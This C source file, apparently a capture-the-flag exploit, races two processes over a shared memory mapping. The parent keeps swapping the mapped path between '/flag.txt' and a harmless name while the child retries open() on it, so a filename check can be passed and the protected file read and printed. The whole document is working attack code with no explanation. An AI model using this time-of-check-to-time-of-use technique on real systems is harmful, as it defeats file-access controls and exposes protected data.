#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/mman.h>
int main(int argc, char **argv) {
    void* XxX = mmap(0,0x1000,7,0x21, open("/tmp/XxX", 2),0);
    int pid= fork();
    if(pid){
        while(1){
            strcpy(XxX,"/flag.txt");
            strcpy(XxX,"/1111.tnt");
        }
    }else{
        int tmp  = -1;
        while(tmp<0)
            tmp = open(XxX,0);
        char buf[0x100]={0};
        read(tmp,buf,0x100);
        puts(buf);
        exit(1);
    }
}